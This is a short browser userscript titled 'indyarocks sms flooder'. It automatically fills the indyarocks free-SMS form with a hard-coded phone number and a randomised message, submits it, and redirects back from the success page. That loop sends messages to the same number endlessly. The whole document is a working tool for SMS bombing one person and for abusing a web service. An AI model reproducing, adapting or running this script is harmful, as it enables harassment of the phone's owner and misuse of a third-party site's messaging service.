// ==UserScript==
// @name           indyarocks sms flooder
// @namespace      SUUNY020
// @description    flood sms sms
// @include        http://*.indyarocks.com/*
// ==/UserScript==

if(document.location=="http://www.indyarocks.com/send/free-sms")
{
document.getElementById('frno').value=8092262928;
document.getElementById('message3').value='SPRITE 

K12'+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+

Math.floor(Math.random()*10)+Math.floor(Math.random()*10)+Math.floor(Math.random()*10);
void(0);
document.forms[0].submit();
}
if(document.location=="http://www.indyarocks.com/send/sms_sent.php?succ=3&frno=8092262928")
document.location="http://www.indyarocks.com/send/free-sms"